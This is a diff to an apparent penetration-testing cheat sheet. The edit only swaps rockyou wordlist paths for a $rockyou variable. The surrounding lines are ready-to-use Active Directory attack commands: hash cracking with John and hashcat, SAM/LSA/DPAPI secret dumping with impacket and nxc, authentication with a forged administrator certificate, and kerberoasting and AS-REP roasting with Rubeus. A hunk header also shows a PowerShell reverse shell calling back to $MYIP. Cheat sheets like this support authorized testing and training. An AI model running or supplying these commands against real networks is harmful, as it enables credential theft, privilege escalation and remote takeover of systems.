@@ -437,10 +437,7 @@ certipy-ad -dc-ip $TARGET auth -pfx 'administrator_forged.pfx'
 
 [*] Cracking
 +---------- John ----------+
-john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-25.txt
-john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-50.txt
-john hashes -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou-75.txt
-john hashes -w=rockyou
+john hashes -w=$rockyou
 john hashes --show
 
 +---------- *2john ----------+
@@ -1189,7 +1186,7 @@ nxc smb $TARGET -u 'dbf' -p '123qweasdF!' --local-auth --sam --lsa --dpapi
 
 impacket-secretsdump -sam sam -system system -security security LOCAL
 echo 'Administrator:500:...................' > hashes
-hashcat -m 1000 -a 0 hashes /usr/share/wordlists/rockyou.txt
+hashcat -m 1000 -a 0 hashes $rockyou
 
 powershell -c "(Get-WmiObject Win32_ComputerSystem).Domain"
 impacket-secretsdump $DOM/'$USERNAME':'$PASSWORD'@$TARGET
@@ -1318,9 +1315,9 @@ powershell -nop -c "$sm=(New-Object Net.Sockets.TCPClient('$MYIP',5555)).GetStre
 
 [*] Rubeus
 Rubeus.exe kerberoast
-nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5tgs
+nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=$rockyou --format=krb5tgs
 Rubeus.exe asreproast
-nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=/usr/share/wordlists/rockyou.txt --format=krb5asrep
+nano hashes; cat hashes | awk '{$1=$1}1' | tr -d '\n' | tee hashes; john hashes -w=$rockyou --format=krb5asrep
 
 # Pivoting
 ## Linux
